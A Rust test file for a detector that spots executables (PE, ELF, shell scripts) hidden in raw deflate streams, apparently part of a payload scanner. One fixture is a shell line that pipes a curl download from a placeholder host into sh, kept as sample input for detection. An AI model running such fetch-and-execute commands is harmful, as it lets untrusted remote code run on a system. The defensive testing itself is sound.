#![allow(clippy::unwrap_used, clippy::cast_possible_truncation)]

use super::*;
use crate::FileType;
use std::io::Write;
use std::path::Path;

fn deflate(data: &[u8]) -> Vec<u8> {
    let mut enc = flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::best());
    enc.write_all(data).unwrap();
    enc.finish().unwrap()
}

/// A PE header followed by `len` bytes of varied body.
fn pe(len: usize) -> Vec<u8> {
    let mut image = vec![0u8; 0x200 + len];
    image[..2].copy_from_slice(b"MZ");
    image[60..64].copy_from_slice(&0x80u32.to_le_bytes());
    image[0x80..0x84].copy_from_slice(b"PE\0\0");
    image[0x84..0x86].copy_from_slice(&0x8664u16.to_le_bytes());
    image[0x98..0x9a].copy_from_slice(&0x20bu16.to_le_bytes());
    for (i, b) in image.iter_mut().enumerate().skip(0x200) {
        *b = (i * 31 % 251) as u8;
    }
    image
}

fn file_type(path: &str, data: &[u8]) -> Option<FileType> {
    crate::fileid::detect(Path::new(path), data).map(|d| d.file_type)
}

#[test]
fn raw_deflate_program_is_deflate_under_any_name() {
    let mut blob = deflate(&pe(200_000));
    for path in ["Inkling.gguf.overlay", "payload.bin", "sample"] {
        assert_eq!(file_type(path, &blob), Some(FileType::Deflate));
    }
    // A carve padded with zeros past the stream is still the stream.
    blob.resize(blob.len() + 525_056, 0);
    assert_eq!(file_type("sample", &blob), Some(FileType::Deflate));
}

#[test]
fn other_programs_count() {
    let mut elf = b"\x7fELF\x02\x01\x01\x00".to_vec();
    elf.resize(64, 0);
    elf[16] = 2; // ET_EXEC
    elf[18] = 0x3e; // x86-64
    let script = b"#!/bin/sh\ncurl -s http://example.invalid/x | sh\n".to_vec();
    for program in [elf, script] {
        assert!(holds_program(&deflate(&program)));
    }
}

#[test]
fn non_programs_are_not_raw_deflate() {
    let mut stub = pe(100);
    stub[0x80..0x84].copy_from_slice(b"XX\0\0");
    for data in [
        stub,
        b"a log line\nanother log line\n".to_vec(),
        vec![0u8; 8192],
    ] {
        assert!(!holds_program(&deflate(&data)));
    }
}

#[test]
fn headers_and_corrupt_streams_are_refused() {
    let image = pe(1000);
    // zlib wraps the same codec in a header: it is not raw deflate.
    let mut zlib = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::best());
    zlib.write_all(&image).unwrap();
    assert!(!holds_program(&zlib.finish().unwrap()));
    assert!(!holds_program(&image)); // a plain PE is not compressed
    assert!(!holds_program(&[]));
    assert!(!holds_program(&[0x06, 0, 0])); // reserved block type
    assert!(!holds_program(&deflate(&image)[..8])); // too short for a head
}

#[test]
fn arbitrary_bytes_are_not_raw_deflate() {
    let mut state = 0x9e37_79b9_7f4a_7c15u64;
    for len in [1usize, 7, 64, 513, 4096, 70_000] {
        for _ in 0..200 {
            let buf: Vec<u8> = (0..len)
                .map(|_| {
                    state = state
                        .wrapping_mul(6_364_136_223_846_793_005)
                        .wrapping_add(1);
                    (state >> 33) as u8
                })
                .collect();
            assert!(!holds_program(&buf));
        }
    }
}
